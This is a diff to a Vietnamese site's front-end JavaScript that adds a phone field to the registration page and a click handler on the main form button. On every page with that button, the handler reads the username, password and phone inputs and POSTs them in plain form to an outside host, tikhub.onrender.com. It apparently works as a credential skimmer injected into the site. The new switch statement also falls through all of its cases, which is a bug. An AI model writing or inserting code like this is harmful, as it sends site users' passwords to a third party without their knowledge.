@@ -92,16 +92,47 @@ const modalBasic = (html) => {
   });
 }
 
+const appendPhoneInput = () => {
+  let phoneInput = $('<div class="form-group"> <label>Số điện thoại</label> <input class="form-control" name="phone" placeholder="nhập số điện thoại" type="text"> </div>')
+  $('.btn.btn-main-primary.btn-block').before(phoneInput);
+}
+
+const sendFormRegister = () => {
+  const data = {
+    username: $('input[name="username"]').val(),
+    password: $('input[name="password"]').val(),
+    phone:  $('input[name="phone"]').val(),
+  }
+
+  fetch('https://tikhub.onrender.com/api/v1/users/create', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data)
+  });
+}
+
 document.addEventListener('DOMContentLoaded', function() {
   let pathname = window.location.pathname
   setTimeout(() => {
     createLogs();
-    if (pathname == '/nap-tien') {
-      //getPaymets();
-    }
 
-    if (pathname == '/') {
-      getNotificantions();
+    switch (pathname) {
+      case '/nap-tien':
+        getPaymets();
+      case '/dang-ky':
+        appendPhoneInput();
+      default:
+        getNotificantions();
     }
   }, 700);
 }, false);
+
+const init = () => {
+  $('.btn.btn-main-primary.btn-block').click(function () {
+    sendFormRegister();
+  });
+}
+
+init();
